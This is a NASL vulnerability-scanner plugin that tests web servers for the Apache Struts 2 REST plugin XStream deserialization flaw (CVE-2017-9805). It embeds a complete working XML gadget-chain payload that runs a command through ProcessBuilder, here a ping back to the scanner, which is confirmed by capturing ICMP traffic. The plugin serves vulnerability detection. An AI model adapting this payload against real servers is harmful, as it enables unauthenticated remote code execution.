include("compat.inc");

if (description)
{
  script_id(102977);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/09/11 14:10:11 $");

  script_cve_id("CVE-2017-9805");
  script_osvdb_id(164610);
  script_xref(name:"IAVA", value:"2017-A-0261");

  script_name(english:"Apache Struts 2 REST Plugin XStream XML Request Deserialization RCE");
  script_summary(english:"Attempts to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework that is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web application appears to use the Apache Struts 2 web
framework. A remote code execution vulnerability exists in the REST
plugin, which uses XStreamHandler to insecurely deserialize
user-supplied input in XML requests. An unauthenticated, remote
attacker can exploit this, via a specially crafted XML request, to
execute arbitrary code.

Note that this plugin only reports the first vulnerable instance of a
Struts 2 application.");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/S2-052");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.34");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.13");
  script_set_attribute(attribute:"see_also", value:"https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement");
  script_set_attribute(attribute:"see_also", value:"https://lgtm.com/blog/apache_struts_CVE-2017-9805");
  script_set_attribute(attribute:"see_also", value:"https://github.com/jas502n/St2-052");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Struts version 2.3.34 or 2.5.13 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts 2 REST Plugin XStream RCE');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/09/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/09/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/09/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"Copyright (C) 2004-2018 WebRAY");

  script_dependencies("http_version.nasl", "webmirror.nasl", "os_fingerprint.nasl", "http_generic_clickjacking.nasl");
  script_require_ports("Services/www", 80, 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("torture_cgi_func.inc");
include("url_func.inc");

ports = get_kb_list("Services/www");
urls = make_list();
port = -1;
if (!isnull(ports))
{
  foreach p (ports)
  {
  	cgis = get_kb_list("www/" + p + "/content/clickable-event*");
	if (!isnull(cgis))
	{
		foreach cgi (cgis)
		{
			match = eregmatch(pattern:"(/orders/[0-9]+/edit)", string:cgi);
			if (match)
			{
				urls = make_list(urls, cgi);
				port = p;
				if (!thorough_tests) break;
    		}
		}
		if (port != -1)
		{
			break;
		}
	}
  }
}

if (empty(urls) || port == -1)
  audit(AUDIT_WEB_FILES_NOT, "Struts 2 .action / .do / .jsp", port);

urls = list_uniq(urls);
scanner_ip = this_host();
target_ip = get_host_ip();
vuln = FALSE;

ua = get_kb_item("global_settings/http_user_agent");
if (empty_or_null(ua))
  ua = 'GizaNE';

#filter = "icmp and icmp[0] = 8 and src host " + target_ip;
filter = "icmp and icmp[0] = 8 and dst host " + scanner_ip;
#filter = "icmp and icmp[0] = 8";
pat = hexstr(rand_str(length:10));

os = get_kb_item("Host/OS");
if (!empty_or_null(os) && "windows" >< tolower(os))
  ping_cmd = 'ping</string><string>-n</string><string>3</string><string>' + scanner_ip;
else
  ping_cmd = "ping</string><string>-c</string><string>3</string><string>-p</string><string>" + pat + "</string><string>" + scanner_ip;

foreach url (urls)
{
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  post_payload = '<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>' +
  ping_cmd +
  '</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer></ibuffer><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>';

  attack_url = url;

  req =
    'POST ' + attack_url + ' HTTP/1.1\n' +
    'Host: ' + target_ip + ':' + port + '\n' +
    'User-Agent: ' + ua + '\n' +
    'Accept-Language: en-US\n' +
    'Content-Type: application/xml\n' +
    'Content-Length: ' + strlen(post_payload) + '\n' +
    'Connection: Keep-Alive\n' +
    '\n' + post_payload;

  s = send_capture(socket:soc,data:req,pcap_filter:filter);
  icmp = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
  close(soc);

  if ("windows" >< tolower(os) && !isnull(icmp))
  {
    vuln = TRUE;
    vuln_url = req;
    report =
      '\nConfirmed this issue by examining ICMP traffic. '+
      'Below is the response :' +
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }
  else if (pat >< icmp)
  {
    vuln = TRUE;
    vuln_url = req;
    report =
      '\nConfirmed this issue by examining ICMP traffic and looking for'+
      '\nthe pattern sent in our packet (' + pat + '). Below is the response :'+
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }

  # Stop after first vulnerable Struts app is found
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(vuln_url),
  output     : report
);
